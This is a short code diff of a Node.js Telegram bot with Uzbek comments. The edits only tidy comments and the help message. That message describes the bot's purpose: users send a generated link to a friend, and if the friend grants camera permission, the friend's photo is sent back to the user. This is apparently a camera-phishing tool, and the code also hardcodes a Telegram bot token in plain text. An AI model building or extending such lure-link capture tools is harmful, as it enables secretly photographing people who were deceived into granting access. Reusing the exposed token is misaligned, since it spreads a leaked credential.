@@ -12,7 +12,7 @@ const PORT = process.env.PORT || 3000;
 
 // Bot token
 const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
-const BASE_URL = "https://korish.onrender.com"; // Render'dagi sayt noming
+const BASE_URL = "https://korish.onrender.com";
 
 // Webhook bilan botni sozlaymiz
 const bot = new TelegramBot(TOKEN);
@@ -26,14 +26,14 @@ const buttons = {
   },
 };
 
-// Webhook endpoint — Telegram shu yo‘ldan xabar yuboradi
+// Webhook endpoint
 app.use(express.json());
 app.post(`/bot${TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// Foydalanuvchi /start bosganda
+// /start
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(
@@ -43,7 +43,7 @@ bot.onText(/\/start/, (msg) => {
   );
 });
 
-// Rasm olish tugmasi
+// Tugmalarni qabul qilish
 bot.on("message", (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
@@ -58,7 +58,7 @@ bot.on("message", (msg) => {
   if (text === "🆘 Yordam") {
     bot.sendMessage(
       chatId,
-      "Shunchaki 📸 Rasm olish tugmasni bosing berilgan linki dostingizga jonating. Agar dostinggiz linga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'gri yo'lda foydalaning."
+      "Shunchaki 📸 Rasm olish tugmasni bosing va berilgan linkni dostingizga jonating. Agar dostingiz linkga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'g'ri yo'lda foydalaning."
     );
     bot.sendVoice(chatId, fs.createReadStream("music/koryapman.mp3"));
   }
